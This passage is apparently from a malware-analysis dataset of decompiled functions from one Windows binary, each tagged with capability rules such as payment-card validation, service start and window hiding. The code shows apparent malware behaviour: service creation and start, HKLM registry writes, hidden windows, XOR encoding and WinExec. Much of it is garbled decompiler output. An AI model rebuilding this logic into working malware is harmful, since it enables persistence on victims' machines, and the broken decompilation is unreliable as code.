acStack97[extraout_ECX_00] = acStack97[extraout_ECX_00] << 1;\n                *pcVar4 = *pcVar4 + pcVar4;\n                *(piVar8 + 0x5e) = *(piVar8 + 0x5e) + unaff_EBX;\n                return pcVar4;\n            }\n            *0x68b8ec43 = *0x68b8ec43 + (uVar3 >> 0x1f);\n            puVar5 = pcVar4 & 0xffffff00 | *(unaff_EBX + (pcVar4 & 0xff));\n            goto code_r0x0040155e;\n        }\n        pcVar1 = *0x4255fc + 0x40;\n        bVar9 = false;\n        *pcVar1 = '\\0';\n        cVar10 = *pcVar1 == '\\0';\n    } while( true );\n}\n",
        "token_count": 1289
    },
    "004015c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004015cb) overlaps instruction at (ram,0x004015c9)\n// \n\nvoid __fastcall fcn.004015c0(uint param_1, char param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_OF != in_SF) || (in_OF == in_SF)) {\n        if (*0x425608 != 0) {\n            return;\n        }\n        in_EAX = *0x425608;\n        if (*0x425608 == 0) goto code_r0x004015de;\n    }\n    *(unaff_EBP + 0x762675c0) = *(unaff_EBP + 0x762675c0) + param_2;\n    puVar1 = unaff_ESI + 0x5e;\n    *puVar1 = *puVar1 | in_EAX;\n    if (*puVar1 == 0) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\ncode_r0x004015de:\n    uVar2 = (*_sym.imp.MSVCRT.dll_time)(0);\n    (*_sym.imp.MSVCRT.dll_srand)(uVar2);\n    *0x425608 = 1;\n    return;\n}\n",
        "token_count": 327
    },
    "00401de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00401de0(uint arg_8h, uint arg_ch)\n\n{\n    uint *arg_8h_00;\n    uint uVar1;\n    uint extraout_EDX;\n    uint unaff_EBP;\n    uint unaff_EDI;\n    bool bVar2;\n    uint *puVar3;\n    \n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    bVar2 = SCARRY4(arg_8h_00, 1);\n    puVar3 = arg_8h_00;\n    fcn.00401b50(arg_8h_00, arg_8h);\n    if ((!bVar2) && (bVar2)) {\n        *puVar3 = unaff_EBP;\n        return CONCAT44(unaff_EDI, unaff_EBP);\n    }\n    uVar1 = fcn.00401ae0(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return CONCAT44(extraout_EDX, uVar1);\n}\n",
        "token_count": 259
    },
    "00402130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402215) overlaps instruction at (ram,0x00402214)\n// \n\nuint8_t * __cdecl fcn.00402130(uint8_t *arg_8h, uint32_t arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    uchar uStack13;\n    \n    uStack13 = unaff_EDI >> 0x18;\n    puVar5 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == NULL) {\n        return arg_8h;\n    }\n    puVar4 = arg_8h;\n    if (arg_8h <= puVar5) {\n        do {\n            if ((arg_8h != puVar5) && (arg_8h == puVar5)) {\n                uVar1 = in(arg_ch);\n                *arg_14h = uVar1;\n                if (0 < &uStack13) {\n                    uVar2 = arg_8h ^ 0xdee0ed6d;\n                    *(arg_ch + 0x3a168a08) = *(arg_ch + 0x3a168a08) ^ puVar4;\n                    return uVar2 & 0xffff0000 | uVar2 + (uVar2 >> 8) * -0x31;\n                }\n                uVar2 = arg_ch >> 8;\n                while( true ) {\n                    *(arg_10h + (puVar5 & 0xffff0000 | CONCAT11((puVar5 >> 8) + uVar2, puVar5))) = arg_ch + 'a';\n                    arg_10h = arg_10h + 1;\n                    if (arg_14h + 1 <= arg_10h) break;\n                    iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n                    arg_8h = iVar3 / 0x1a;\n                    arg_ch = iVar3 % 0x1a;\n                }\n                return arg_8h;\n            }\n            puVar4 = *arg_8h;\n            arg_ch = arg_ch & 0xffffff00 | *arg_10h;\n            if (*arg_8h == *arg_10h) {\n                puVar4 = arg_14h + -1;\n                arg_ch = 0;\n                bVar8 = true;\n                puVar6 = arg_8h;\n                puVar7 = arg_10h;\n                do {\n                    puVar7 = puVar7 + 1;\n                    puVar6 = puVar6 + 1;\n                    if (puVar4 == NULL) break;\n                    puVar4 = puVar4 + -1;\n                    bVar8 = *puVar6 == *puVar7;\n                } while (bVar8);\n                if (bVar8) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= puVar5);\n    }\n    return NULL;\n}\n",
        "token_count": 729
    },
    "004021e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004021e0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t unaff_EDI;\n    bool in_SF;\n    float10 in_ST0;\n    \n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n    }\n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 184
    },
    "004031d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403206) overlaps instruction at (ram,0x00403202)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004031d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *in_EDX;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    unkbyte10 in_ST0;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    bVar7 = SBORROW4(&stack0xfffffffc, 0x24);\n    if ((!bVar7) && (bVar7)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if ((0x23 < &stack0xfffffffc) && (bVar7 != &var_24h < 0)) {\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        *in_EDX = *in_EDX + -0x7f9f207c;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    var_4h = fcn.00402130(arg_18h, arg_1ch, 0x40706c, 7);\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    if (var_4h == NULL) {\n        return 0;\n    }\n    var_24h = 0;\n    puVar5 = &var_23h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    uVar4 = 0;\n    do {\n        uVar2 = (*pcVar1)();\n        (&var_24h)[uVar4] = uVar2;\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 0x20);\n    puVar5 = &var_24h;\n    puVar6 = var_4h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    fcn.00401650(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    fcn.00401810(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 704
    },
    "00403360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403360(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.004037e0(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "004033c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403423) overlaps instruction at (ram,0x00403421)\n// \n// WARNING: Removing unreachable block (ram,0x00403423)\n\nuint __thiscall\nfcn.004033c0(uint param_1, uint32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint32_t unaff_EDI;\n    uint16_t in_ES;\n    bool in_SF;\n    uint uStack8;\n    \n    uVar3 = 1;\n    if ((in_SF) || (uVar2 = param_1,  !in_SF)) {\n        uVar2 = param_3;\n    }\n    uStack8 = param_1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(param_2, uVar2, 0, 0xf003f, &uStack8);\n    if (iVar1 == 0) {\n        if ((-1 < iVar1) && (-1 >= iVar1)) {\n            param_2 = param_2 & 0xffff0000 | in_ES;\n            uVar3 = 0;\n            *(unaff_EDI | &stack0xfffffffc) = 0;\n        }\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(uStack8, param_4, 0, param_5, param_6, param_7, param_2);\n        if (iVar1 != 0) {\n            uVar3 = 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack8);\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 401
    },
    "00403470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004034af) overlaps instruction at (ram,0x004034ad)\n// \n// WARNING: Removing unreachable block (ram,0x004034c1)\n// WARNING: Removing unreachable block (ram,0x004034a6)\n\nvoid __cdecl fcn.00403470(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t *unaff_EDI;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    \n    iVar3 = 0;\n    bVar4 = false;\n    bVar6 = false;\n    bVar5 = arg_14h == 0;\n    if (0 < arg_14h) {\n        do {\n            if ((!bVar4 && !bVar5) && (bVar4 || bVar5)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            uVar1 = *(iVar3 + arg_10h);\n            if ((!bVar6) && (bVar6)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar2 = *(iVar3 % arg_ch + arg_8h);\n            *unaff_EDI = iVar3 + 4;\n            *(arg_10h + 0x52b8ec44) = arg_14h ^ uVar1 ^ uVar2;\n            iVar3 = 0x52b8ec45;\n            bVar4 = 0x52b8ec45 < arg_14h;\n            bVar6 = SBORROW4(0x52b8ec45, arg_14h);\n            bVar5 = arg_14h == 0x52b8ec45;\n        } while (0x52b8ec45 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 462
    },
    "00403520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403706) overlaps instruction at (ram,0x00403704)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t fcn.00403520(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint16_t extraout_CX;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    char extraout_DH;\n    uint extraout_EDX;\n    char *pcVar5;\n    uint extraout_EDX_00;\n    uint32_t extraout_EDX_01;\n    uint unaff_EBX;\n    uint *unaff_ESI;\n    uint *puVar6;\n    uint8_t in_AF;\n    bool bVar7;\n    bool bVar8;\n    char cVar9;\n    char cVar10;\n    bool bVar11;\n    uint64_t uVar12;\n    ulong uVar13;\n    uint64_t uVar14;\n    uchar uStack536;\n    uint uStack535;\n    uchar uStack276;\n    uint uStack275;\n    int32_t iStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack536 = 0;\n    puVar6 = &stack0xfffffde9;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    uStack276 = 0;\n    puVar6 = &stack0xfffffeed;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    iStack16 = 1;\n    *(puVar6 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&stack0xfffffde8, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&stack0xfffffeec, 0x407048, &stack0xfffffde8, param_1);\n    cVar10 = '\\0';\n    cVar9 = '\\0';\n    bVar7 = (((extraout_CX & 0x4ed ^ 0x3f6f) >> 8) + extraout_DH & 0x5bU) == 0;\n    fcn.004040a0(&stack0xfffffff8, &stack0xfffffff4);\n    uVar3 = uStack12;\n    if ((!bVar7 && cVar10 == cVar9) && (bVar7 || cVar10 != cVar9)) {\n        uVar3 = extraout_EDX;\n    }\n    iVar4 = fcn.004031d0(param_1, param_2, param_3, param_4, uStack8, uVar3);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    iVar4 = fcn.00402020(&stack0xfffffeec, uStack8, uStack12);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    fcn.00403b80();\n    iVar4 = fcn.00401420(0x407080);\n    if (iVar4 == -1) {\n        uVar14 = fcn.00401420(0x407074);\n        uVar2 = uVar14 + 1;\n        iVar4 = extraout_ECX;\n        if (uVar2 == 0) goto code_r0x004036ef;\n        unaff_ESI = 0xf;\n    }\n    else {\n        unaff_ESI = 0xa;\n    }\n    uVar12 = fcn.00404c20(param_1);\n    uVar14 = uVar12 & 0xffffffff00000000 | *0x425628;\n    if (uVar12 != 0) {\n        fcn.00402230(unaff_ESI);\n        fcn.004033b0(unaff_ESI);\n        return 1;\n    }\n    iVar4 = extraout_ECX_00;\n    uVar2 = *0x425628;\n    if (*0x425628 == 0) {\n        return 0;\n    }\ncode_r0x004036ef:\n    pcVar5 = uVar14 >> 0x20;\n    uVar3 = uVar14;\n    bVar7 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if ((bVar7) && (!bVar7)) {\n        out(*unaff_ESI, uVar14 >> 0x20);\n        do {\n            cVar9 = uVar3 >> 8;\n            in_AF = 9 < (uVar3 & 0xf) | in_AF;\n            uVar3 = CONCAT31(CONCAT21(uVar3 >> 0x10, cVar9 - in_AF), -in_AF);\n        } while (in_AF || cVar9 == *pcVar5);\n        piVar1 = param_1 + pcVar5 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(iVar4 + -0x73) = uVar3;\n        LOCK();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar13 = fcn.00401de0(param_1, &stack0xfffffeec);\n    uVar3 = uVar13 >> 0x20;\n    iVar4 = iStack16;\n    if (uVar13 == 0) {\n        iVar4 = 0;\n    }\n    if (iVar4 != 0) {\n        uVar13 = fcn.00403360(param_1);\n        uVar3 = uVar13 >> 0x20;\n        if (uVar13 == 0) {\n            iVar4 = uVar13;\n        }\n    }\n    uVar14 = CONCAT44(uVar3, iVar4);\n    if (iVar4 == 0) {\n        uVar14 = fcn.00401000(param_1, 0);\n    }\n    while( true ) {\n        uVar3 = uVar14 >> 0x20;\n        iVar4 = uVar14;\n        if (iVar4 != 0) {\n            fcn.004033b0(0xffffffff);\n            uVar3 = extraout_EDX_00;\n        }\n        bVar7 = false;\n        bVar11 = false;\n        bVar8 = (((unaff_EBX ^ uVar14) >> 8) - 1U & 0xd) == 0;\n        unaff_EBX = 0x403799;\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        uVar14 = uVar14 & 0xffffffff | extraout_EDX_01 << 0x20;\n        if ((bVar7 || bVar8) || (!bVar7 && !bVar8)) break;\n        if (!bVar11) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x407094, 0, uVar3);\n    return iVar4;\n}\n",
        "token_count": 1701
    },
    "004037e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004037e0(uint hSCManager, uint lpServiceName)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    uVar1 = *((&stack0xfffffffc & 0xffff0000 | *0x10 - 4) + 0xc);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(uVar1, 0, 0);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar2)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n    return 1;\n}\n",
        "token_count": 275
    },
    "00403880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403911) overlaps instruction at (ram,0x0040390e)\n// \n\nuint __cdecl fcn.00403880(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *extraout_ECX;\n    uint *puVar2;\n    uchar uVar3;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    uVar3 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    if ((uVar3) || (puVar2 = extraout_ECX,  !uVar3)) {\n        puVar2 = &var_8h;\n    }\n    fcn.00404f60(&var_4h, puVar2);\n    fcn.004039a0(var_4h);\n    iVar1 = fcn.00402020(&s, var_4h, var_8h);\n    if (iVar1 != 0) {\n        fcn.004012b0(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 444
    },
    "00403b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403ba4) overlaps instruction at (ram,0x00403ba1)\n// \n\nbool fcn.00403b80(void)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint *arg_8h;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    bool in_OF;\n    char *var_4h;\n    \n    var_4h = NULL;\n    if ((in_OF) || (!in_OF)) {\n        arg_8h = &var_4h;\n    }\n    else {\n        arg_8h = CONCAT31(in_EAX >> 8, 0x98);\n    }\n    iVar2 = fcn.00403e80(arg_8h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071f0, 0x407230, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 347
    },
    "004041b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004041b0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00404c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404c20(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t unaff_EBX;\n    bool in_CF;\n    uint8_t in_AF;\n    bool in_ZF;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        if (in_CF || unaff_EBX + 1 == 0) {\n            uVar4 = (**(in_EAX + 0x3b))();\n            return uVar4;\n        }\n        uVar2 = 9 < (in_EAX & 0xf) | in_AF;\n        piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar2, in_EAX + uVar2 * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    iVar3 = fcn.00401000(arg_8h, 1);\n    return iVar3 != 0;\n}\n",
        "token_count": 273
    },
    "00404c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404c7b) overlaps instruction at (ram,0x00404c7a)\n// \n\nint32_t __cdecl fcn.00404c50(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    ushort in_DX;\n    char unaff_BL;\n    uint *unaff_EDI;\n    bool bVar4;\n    int32_t iVar5;\n    \n    iVar3 = arg_ch + -1;\n    bVar4 = iVar3 == 0;\n    if (bVar4) {\n        if (!bVar4) {\n            if (bVar4) {\n                uVar1 = in(in_DX);\n                *unaff_EDI = uVar1;\n                if (0 < &stack0xfffffff4) {\n                    iVar3 = (**((in_ECX >> 8 ^ 0x10 | 0xdee00000) + 0x3b))();\n                    return iVar3;\n                }\n                goto code_r0x00404ce5;\n            }\n        }\n        fcn.004024c0();\n        fcn.00401c60();\n        fcn.004049e0();\n        if (*0x425628 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00402260();\n        }\n    }\n    iVar2 = arg_8h;\n    iVar5 = arg_ch;\n    iVar3 = (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    arg_ch = iVar2;\n    unaff_BL = iVar5;\ncode_r0x00404ce5:\n    *(arg_ch + 0x5b) = *(arg_ch + 0x5b) + unaff_BL;\n    return iVar3 + 1;\n}\n",
        "token_count": 439
    },
    "00402470": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402470(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00401260": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401260(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407010, 0x4255f8, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 139
    },
    "00401c60": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401c94) overlaps instruction at (ram,0x00401c92)\n// \n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00401c60(void)\n\n{\n    int32_t *piVar1;\n    char cVar5;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    char *pcVar6;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    ulong uVar10;\n    uint32_t var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    uVar10 = fcn.00404120(unaff_EDI, var_80h);\n    pcVar6 = uVar10 >> 0x20;\n    uVar2 = uVar10;\n    bVar8 = false;\n    bVar9 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 == 0) {\n        return 0;\n    }\n    if ((bVar9) && (!bVar9)) {\n        out(*unaff_ESI, uVar10 >> 0x20);\n        do {\n            cVar5 = uVar2 >> 8;\n            in_AF = 9 < (uVar2 & 0xf) | in_AF;\n            uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar5 - in_AF), -in_AF);\n        } while (in_AF || cVar5 == *pcVar6);\n        piVar1 = unaff_EDI + pcVar6 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(extraout_ECX + -0x18) = uVar2;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar2 = fcn.004014f0();\n    if ((!bVar8) && (bVar8)) {\n        out(0xbd, uVar2);\n        return uVar2;\n    }\n    iVar3 = fcn.00401420(0x40708c);\n    bVar8 = (POPCOUNT(iVar3 + 1U & 0xff) & 1U) == 0;\n    if (iVar3 + 1U != 0) {\n        return 0;\n    }\n    uVar10 = fcn.00402ae0();\n    pcVar6 = uVar10 >> 0x20;\n    uVar4 = uVar10;\n    *0x42562c = 1;\n    if ((!bVar8) && (bVar8)) {\n        out(*unaff_ESI, uVar10 >> 0x20);\n        do {\n            cVar5 = uVar4 >> 8;\n            in_AF = 9 < (uVar4 & 0xf) | in_AF;\n            uVar4 = CONCAT31(CONCAT21(uVar4 >> 0x10, cVar5 - in_AF), -in_AF);\n        } while (in_AF || cVar5 == *pcVar6);\n        piVar1 = unaff_EDI + pcVar6 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(extraout_ECX_00 + -0x18) = uVar4;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar3 = fcn.004019f0();\n    if (iVar3 != 0) {\n        return 0;\n    }\n    var_20h = 0;\n    var_80h = var_80h & 0xffffff00;\n    puVar7 = &var_1fh;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar7 = &var_80h + 1;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar7 = &var_60h + 1;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    puVar7 = &var_40h + 1;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    iVar3 = fcn.00401890(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.00403880(&var_20h);\n        if (iVar3 != 0) {\n            iVar3 = fcn.00403520(&var_80h, &var_60h, &var_20h, &var_40h);\n            return iVar3 != 0;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 1405
    },
